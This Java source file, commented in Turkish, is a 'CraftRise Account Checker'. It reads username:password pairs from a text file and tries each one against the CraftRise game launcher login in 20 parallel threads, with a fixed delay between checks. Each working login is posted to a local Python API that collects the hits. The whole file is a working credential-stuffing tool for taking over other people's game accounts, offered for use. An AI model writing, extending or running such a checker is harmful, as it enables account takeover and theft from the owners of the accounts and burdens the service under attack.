package rac;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * CraftRise Account Checker - Python API Entegrasyonu
 * Hesapları kontrol eder ve başarılı olanları Python API'ye bildirir
 */
public class AccountChecker {
    // ANSI Renk Kodları
    private static final String ANSI_RESET = "\u001b[0m";
    private static final String ANSI_GREEN = "\u001b[32m";
    private static final String ANSI_RED = "\u001b[31m";
    private static final String ANSI_YELLOW = "\u001b[33m";
    private static final String ANSI_CYAN = "\u001b[36m";
    
    // Konfigürasyon
    private static final String PYTHON_API_URL = "http://127.0.0.1:8080";
    private static final String ACCOUNTS_FILE = "hesaplar.txt";
    private static final int THREAD_COUNT = 20;
    private static final long DELAY_BETWEEN_CHECKS = 1900; // ms
    private static final int API_TIMEOUT = 5000; // ms
    
    // İstatistikler
    private static final AtomicInteger totalChecked = new AtomicInteger(0);
    private static final AtomicInteger successCount = new AtomicInteger(0);
    private static final AtomicInteger failCount = new AtomicInteger(0);

    public static void main(String[] args) {
        // Python API kontrolü
        if (!checkPythonAPI()) {
            return;
        }
        
        // Hesaplar dosyası kontrolü
        Path accountsFile = Paths.get(ACCOUNTS_FILE);
        if (!Files.exists(accountsFile, new LinkOption[0])) {
            handleMissingAccountsFile(accountsFile);
            return;
        }
        
        // Hesapları işle
        processAccounts(accountsFile);
    }
    
    /**
     * Hesapları okur ve kontrol eder
     */
    private static void processAccounts(Path accountsFile) {
        try {
            List<String> lines = Files.readAllLines(accountsFile);
            if (lines.isEmpty()) {
                System.out.println(ANSI_RED + "❌ Hesap dosyası boş!" + ANSI_RESET);
                return;
            }
            
            int totalAccounts = (int) lines.stream()
                .filter(l -> !l.trim().isEmpty() && l.contains(":"))
                .count();
            
            System.out.println(ANSI_CYAN + "═══════════════════════════════════════════════════" + ANSI_RESET);
            System.out.println(ANSI_CYAN + "  CraftRise Account Checker - Python API Edition" + ANSI_RESET);
            System.out.println(ANSI_CYAN + "═══════════════════════════════════════════════════" + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "📊 Toplam Hesap: " + totalAccounts + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "🔧 Thread Sayısı: " + THREAD_COUNT + ANSI_RESET);
            System.out.println(ANSI_CYAN + "═══════════════════════════════════════════════════\n" + ANSI_RESET);
            
            // Stats'ı Python API'ye gönder
            notifyPythonStats(totalAccounts);
            
            // Thread pool oluştur ve hesapları kontrol et
            ExecutorService executor = Executors.newFixedThreadPool(THREAD_COUNT);
            
            for (String line : lines) {
                if (line.trim().isEmpty() || !line.contains(":")) continue;
                
                String[] parts = line.split(":", 2);
                String username = parts[0].trim();
                String password = parts[1].trim();
                
                executor.submit(() -> checkAccount(username, password, totalAccounts));
            }
            
            executor.shutdown();
            executor.awaitTermination(1L, TimeUnit.HOURS);
            
            // Final özet
            System.out.println("\n" + ANSI_CYAN + "═══════════════════════════════════════════════════" + ANSI_RESET);
            System.out.println(ANSI_CYAN + "  Kontrol Tamamlandı!" + ANSI_RESET);
            System.out.println(ANSI_CYAN + "═══════════════════════════════════════════════════" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "✅ Başarılı: " + successCount.get() + ANSI_RESET);
            System.out.println(ANSI_RED + "❌ Başarısız: " + failCount.get() + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "📊 Toplam: " + totalChecked.get() + ANSI_RESET);
            System.out.println(ANSI_CYAN + "═══════════════════════════════════════════════════" + ANSI_RESET);
            
        } catch (IOException e) {
            System.err.println(ANSI_RED + "❌ Dosya okuma hatası: " + e.getMessage() + ANSI_RESET);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            System.err.println(ANSI_RED + "❌ İşlem kesildi!" + ANSI_RESET);
        }
    }
    
    /**
     * Tek bir hesabı kontrol eder
     */
    private static void checkAccount(String username, String password, int totalAccounts) {
        try {
            // Rate limiting
            Thread.sleep(DELAY_BETWEEN_CHECKS);
            
            int current = totalChecked.incrementAndGet();
            
            String sessionHash = LauncherAPI.getGlobalSessionHash(username, password);
            
            if (sessionHash != null) {
                successCount.incrementAndGet();
                System.out.println(ANSI_GREEN + "✅ [" + current + "/" + totalAccounts + "] " + 
                                 username + " - Başarılı!" + ANSI_RESET);
                notifyPythonSuccess(username, password);
            } else {
                failCount.incrementAndGet();
                System.out.println(ANSI_RED + "❌ [" + current + "/" + totalAccounts + "] " + 
                                 username + " - Başarısız" + ANSI_RESET);
                notifyPythonFailed();
            }
            
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            failCount.incrementAndGet();
            int current = totalChecked.get();
            System.out.println(ANSI_RED + "❌ [" + current + "/" + totalAccounts + "] " + 
                             username + " - Hata: " + e.getMessage() + ANSI_RESET);
            notifyPythonFailed();
        }
    }
    
    // ==================== UI HELPERS ====================
    
    private static void handleMissingAccountsFile(Path accountsFile) {
        System.out.println(ANSI_RED + "❌ Hesap dosyası bulunamadı: " + ACCOUNTS_FILE + ANSI_RESET);
        System.out.println(ANSI_YELLOW + "📝 Örnek dosya oluşturuluyor..." + ANSI_RESET);
        try {
            Files.write(accountsFile, "ornek_kullanici:ornek_sifre\nyeni_kullanici:123456".getBytes(), new OpenOption[0]);
            System.out.println(ANSI_GREEN + "✅ Örnek dosya oluşturuldu! Lütfen hesaplarınızı ekleyin." + ANSI_RESET);
        } catch (IOException e) {
            System.err.println(ANSI_RED + "❌ Dosya oluşturulamadı: " + e.getMessage() + ANSI_RESET);
        }
    }
    
    // ==================== PYTHON API COMMUNICATION ====================
    
    /**
     * Python API'nin çalışıp çalışmadığını kontrol eder
     */
    private static boolean checkPythonAPI() {
        System.out.println(ANSI_YELLOW + "🔍 Python API kontrol ediliyor..." + ANSI_RESET);
        try {
            URL url = new URL(PYTHON_API_URL + "/stats");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(API_TIMEOUT);
            conn.setReadTimeout(API_TIMEOUT);
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
            if (responseCode == 200) {
                System.out.println(ANSI_GREEN + "✅ Python API bağlantısı başarılı!\n" + ANSI_RESET);
                return true;
            } else {
                System.out.println(ANSI_RED + "❌ Python API yanıt vermiyor (HTTP " + responseCode + ")" + ANSI_RESET);
                System.out.println(ANSI_YELLOW + "💡 Lütfen Python API'yi başlatın: python api.py" + ANSI_RESET);
                return false;
            }
        } catch (Exception e) {
            System.out.println(ANSI_RED + "❌ Python API'ye bağlanılamadı: " + e.getMessage() + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "💡 Lütfen Python API'yi başlatın: python api.py" + ANSI_RESET);
            return false;
        }
    }
    
    /**
     * Toplam hesap sayısını Python API'ye bildirir
     */
    private static void notifyPythonStats(int total) {
        sendPythonRequest("/stats", "{\"total\": " + total + "}");
    }
    
    /**
     * Başarılı login'i Python API'ye bildirir
     */
    private static void notifyPythonSuccess(String username, String password) {
        String jsonPayload = String.format("{\"username\": \"%s\", \"password\": \"%s\"}", 
                                          escapeJson(username), escapeJson(password));
        sendPythonRequest("/check-success", jsonPayload);
    }
    
    /**
     * Başarısız login'i Python API'ye bildirir
     */
    private static void notifyPythonFailed() {
        sendPythonRequest("/check-failed", "{}");
    }
    
    /**
     * Python API'ye HTTP POST isteği gönderir
     */
    private static void sendPythonRequest(String endpoint, String jsonPayload) {
        try {
            URL url = new URL(PYTHON_API_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(API_TIMEOUT);
            conn.setReadTimeout(API_TIMEOUT);
            conn.setDoOutput(true);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
            }
            
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            // Sessizce devam et - Python API isteğe bağlı
        }
    }
    
    /**
     * JSON string'i için escape işlemi
     */
    private static String escapeJson(String str) {
        return str.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\n", "\\n")
                  .replace("\r", "\\r")
                  .replace("\t", "\\t");
    }
}
